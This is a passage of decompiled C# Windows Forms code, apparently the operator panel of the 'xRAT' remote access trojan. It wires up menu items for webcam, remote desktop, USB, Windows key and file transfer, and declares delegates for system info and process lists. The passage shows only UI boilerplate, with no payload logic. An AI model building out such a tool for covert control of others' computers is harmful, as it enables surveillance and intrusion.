        internal virtual TextBox textsteam
        {
            get
            {
                return this._textsteam;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._textsteam = value;
            }
        }

        internal virtual System.Windows.Forms.Timer Timer1
        {
            get
            {
                return this.timer_0;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.Timer1_Tick);
                if (this.timer_0 != null)
                {
                    this.timer_0.Tick -= handler;
                }
                this.timer_0 = value;
                if (this.timer_0 != null)
                {
                    this.timer_0.Tick += handler;
                }
            }
        }

        internal virtual ToolStripSeparator ToolStripMenuItem1
        {
            get
            {
                return this._ToolStripMenuItem1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripMenuItem1 = value;
            }
        }

        internal virtual ToolStripMenuItem ToolStripMenuItem2
        {
            get
            {
                return this._ToolStripMenuItem2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.method_12);
                EventHandler handler2 = new EventHandler(this.method_11);
                EventHandler handler3 = new EventHandler(this.method_5);
                if (this._ToolStripMenuItem2 != null)
                {
                    this._ToolStripMenuItem2.MouseLeave -= handler;
                    this._ToolStripMenuItem2.MouseEnter -= handler2;
                    this._ToolStripMenuItem2.Click -= handler3;
                }
                this._ToolStripMenuItem2 = value;
                if (this._ToolStripMenuItem2 != null)
                {
                    this._ToolStripMenuItem2.MouseLeave += handler;
                    this._ToolStripMenuItem2.MouseEnter += handler2;
                    this._ToolStripMenuItem2.Click += handler3;
                }
            }
        }

        internal virtual ToolStripSeparator ToolStripSeparator1
        {
            get
            {
                return this._ToolStripSeparator1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripSeparator1 = value;
            }
        }

        internal virtual ToolStripSeparator ToolStripSeparator10
        {
            get
            {
                return this._ToolStripSeparator10;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripSeparator10 = value;
            }
        }

        internal virtual ToolStripSeparator ToolStripSeparator11
        {
            get
            {
                return this._ToolStripSeparator11;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripSeparator11 = value;
            }
        }

        internal virtual ToolStripSeparator ToolStripSeparator12
        {
            get
            {
                return this._ToolStripSeparator12;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripSeparator12 = value;
            }
        }

        internal virtual ToolStripSeparator ToolStripSeparator13
        {
            get
            {
                return this._ToolStripSeparator13;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripSeparator13 = value;
            }
        }

        internal virtual ToolStripSeparator ToolStripSeparator2
        {
            get
            {
                return this._ToolStripSeparator2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripSeparator2 = value;
            }
        }

        internal virtual ToolStripSeparator ToolStripSeparator3
        {
            get
            {
                return this.CbrcOhuJaN;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.CbrcOhuJaN = value;
            }
        }

        internal virtual ToolStripSeparator ToolStripSeparator4
        {
            get
            {
                return this._ToolStripSeparator4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripSeparator4 = value;
            }
        }

        internal virtual ToolStripSeparator ToolStripSeparator5
        {
            get
            {
                return this._ToolStripSeparator5;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripSeparator5 = value;
            }
        }

        internal virtual ToolStripSeparator ToolStripSeparator6
        {
            get
            {
                return this._ToolStripSeparator6;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripSeparator6 = value;
            }
        }

        internal virtual ToolStripSeparator ToolStripSeparator7
        {
            get
            {
                return this._ToolStripSeparator7;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripSeparator7 = value;
            }
        }

        internal virtual ToolStripSeparator ToolStripSeparator8
        {
            get
            {
                return this._ToolStripSeparator8;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripSeparator8 = value;
            }
        }

        internal virtual ToolStripSeparator ToolStripSeparator9
        {
            get
            {
                return this._ToolStripSeparator9;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripSeparator9 = value;
            }
        }

        internal virtual ToolStripSplitButton ToolStripSplitButton1
        {
            get
            {
                return this._ToolStripSplitButton1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripSplitButton1 = value;
            }
        }

        internal virtual ToolStripStatusLabel ToolStripStatusLabel1
        {
            get
            {
                return this._ToolStripStatusLabel1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripStatusLabel1 = value;
            }
        }

        internal virtual ToolStripStatusLabel ToolStripStatusLabel2
        {
            get
            {
                return this._ToolStripStatusLabel2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripStatusLabel2 = value;
            }
        }

        internal virtual ToolStripTextBox ToolStripTextBox1
        {
            get
            {
                return this._ToolStripTextBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripTextBox1 = value;
            }
        }

        internal virtual ToolStripTextBox ToolStripTextBox10
        {
            get
            {
                return this._ToolStripTextBox10;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripTextBox10 = value;
            }
        }

        internal virtual ToolStripTextBox ToolStripTextBox11
        {
            get
            {
                return this._ToolStripTextBox11;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripTextBox11 = value;
            }
        }

        internal virtual ToolStripTextBox ToolStripTextBox12
        {
            get
            {
                return this._ToolStripTextBox12;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripTextBox12 = value;
            }
        }

        internal virtual ToolStripTextBox ToolStripTextBox13
        {
            get
            {
                return this._ToolStripTextBox13;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripTextBox13 = value;
            }
        }

        internal virtual ToolStripTextBox ToolStripTextBox14
        {
            get
            {
                return this._ToolStripTextBox14;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.ToolStripTextBox14_Click);
                if (this._ToolStripTextBox14 != null)
                {
                    this._ToolStripTextBox14.Click -= handler;
                }
                this._ToolStripTextBox14 = value;
                if (this._ToolStripTextBox14 != null)
                {
                    this._ToolStripTextBox14.Click += handler;
                }
            }
        }

        internal virtual ToolStripTextBox ToolStripTextBox2
        {
            get
            {
                return this._ToolStripTextBox2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripTextBox2 = value;
            }
        }

        internal virtual ToolStripTextBox ToolStripTextBox3
        {
            get
            {
                return this._ToolStripTextBox3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripTextBox3 = value;
            }
        }

        internal virtual ToolStripTextBox ToolStripTextBox4
        {
            get
            {
                return this._ToolStripTextBox4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripTextBox4 = value;
            }
        }

        internal virtual ToolStripTextBox ToolStripTextBox5
        {
            get
            {
                return this._ToolStripTextBox5;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripTextBox5 = value;
            }
        }

        internal virtual ToolStripTextBox ToolStripTextBox6
        {
            get
            {
                return this._ToolStripTextBox6;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripTextBox6 = value;
            }
        }

        internal virtual ToolStripTextBox ToolStripTextBox7
        {
            get
            {
                return this._ToolStripTextBox7;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripTextBox7 = value;
            }
        }

        internal virtual ToolStripTextBox ToolStripTextBox8
        {
            get
            {
                return this._ToolStripTextBox8;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripTextBox8 = value;
            }
        }

        internal virtual ToolStripTextBox ToolStripTextBox9
        {
            get
            {
                return this._ToolStripTextBox9;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ToolStripTextBox9 = value;
            }
        }

        internal virtual ToolStripMenuItem TracerouteIPToolStripMenuItem
        {
            get
            {
                return this._TracerouteIPToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.TracerouteIPToolStripMenuItem_Click);
                if (this._TracerouteIPToolStripMenuItem != null)
                {
                    this._TracerouteIPToolStripMenuItem.Click -= handler;
                }
                this._TracerouteIPToolStripMenuItem = value;
                if (this._TracerouteIPToolStripMenuItem != null)
                {
                    this._TracerouteIPToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripStatusLabel txtListening
        {
            get
            {
                return this._txtListening;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._txtListening = value;
            }
        }

        internal virtual ToolStripStatusLabel txtOnline
        {
            get
            {
                return this.YmuEnWtCyp;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.YmuEnWtCyp = value;
            }
        }

        internal virtual ToolStripMenuItem UDPToolStripMenuItem
        {
            get
            {
                return this._UDPToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._UDPToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem UnfreezeToolStripMenuItem
        {
            get
            {
                return this._UnfreezeToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._UnfreezeToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem UsbToolStripMenuItem
        {
            get
            {
                return this._UsbToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.UsbToolStripMenuItem_Click);
                if (this._UsbToolStripMenuItem != null)
                {
                    this._UsbToolStripMenuItem.Click -= handler;
                }
                this._UsbToolStripMenuItem = value;
                if (this._UsbToolStripMenuItem != null)
                {
                    this._UsbToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem UsernameToolStripMenuItem
        {
            get
            {
                return this._UsernameToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.UsernameToolStripMenuItem_Click);
                if (this._UsernameToolStripMenuItem != null)
                {
                    this._UsernameToolStripMenuItem.Click -= handler;
                }
                this._UsernameToolStripMenuItem = value;
                if (this._UsernameToolStripMenuItem != null)
                {
                    this._UsernameToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem VersionToolStripMenuItem
        {
            get
            {
                return this._VersionToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.VersionToolStripMenuItem_Click);
                if (this._VersionToolStripMenuItem != null)
                {
                    this._VersionToolStripMenuItem.Click -= handler;
                }
                this._VersionToolStripMenuItem = value;
                if (this._VersionToolStripMenuItem != null)
                {
                    this._VersionToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem ViewRemoteDesktopToolStripMenuItem
        {
            get
            {
                return this._ViewRemoteDesktopToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.ViewRemoteDesktopToolStripMenuItem_Click);
                if (this._ViewRemoteDesktopToolStripMenuItem != null)
                {
                    this._ViewRemoteDesktopToolStripMenuItem.Click -= handler;
                }
                this._ViewRemoteDesktopToolStripMenuItem = value;
                if (this._ViewRemoteDesktopToolStripMenuItem != null)
                {
                    this._ViewRemoteDesktopToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem VisitWebsiteToolStripMenuItem
        {
            get
            {
                return this._VisitWebsiteToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.VisitWebsiteToolStripMenuItem_Click);
                if (this._VisitWebsiteToolStripMenuItem != null)
                {
                    this._VisitWebsiteToolStripMenuItem.Click -= handler;
                }
                this._VisitWebsiteToolStripMenuItem = value;
                if (this._VisitWebsiteToolStripMenuItem != null)
                {
                    this._VisitWebsiteToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem WebcamToolStripMenuItem
        {
            get
            {
                return this._WebcamToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.WebcamToolStripMenuItem_Click);
                if (this._WebcamToolStripMenuItem != null)
                {
                    this._WebcamToolStripMenuItem.Click -= handler;
                }
                this._WebcamToolStripMenuItem = value;
                if (this._WebcamToolStripMenuItem != null)
                {
                    this._WebcamToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual Win8Progressbar Win8Progressbar1
        {
            get
            {
                return this._Win8Progressbar1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Win8Progressbar1 = value;
            }
        }

        internal virtual ToolStripMenuItem WindowsKeyToolStripMenuItem
        {
            get
            {
                return this._WindowsKeyToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.WindowsKeyToolStripMenuItem_Click);
                if (this._WindowsKeyToolStripMenuItem != null)
                {
                    this._WindowsKeyToolStripMenuItem.Click -= handler;
                }
                this._WindowsKeyToolStripMenuItem = value;
                if (this._WindowsKeyToolStripMenuItem != null)
                {
                    this._WindowsKeyToolStripMenuItem.Click += handler;
                }
            }
        }

        public delegate void AddDelegate(xRAT.Connection client, string[] strings);

        public delegate void DelDisplayMessage(string msg);

        public delegate void DelDrives(string drives);

        public delegate void DelegateGetSysInfo(string os, string cpu, string cores, string videocard, string windir, string ram, string isAdmin);

        public delegate void DelegateRemoteDesk(Image deskimage, int bytecount);

        public delegate void DelSaveDownloadedFile(xRAT.Connection client, byte[] content, string name);

        public delegate void DelToggleListen();

        public delegate void DirDelegate(string dirs, string files, string path);

        public delegate void DisconnectedDelegate(xRAT.Connection client);

        public delegate void PrcListDelegate(string prcs);

        public delegate void RefreshDelegate();

        public delegate void UpdateStatusDelegate(xRAT.Connection client, string Message);

        public delegate void UpdateStatusFilemanagerDelegate(string Message);
    }
}

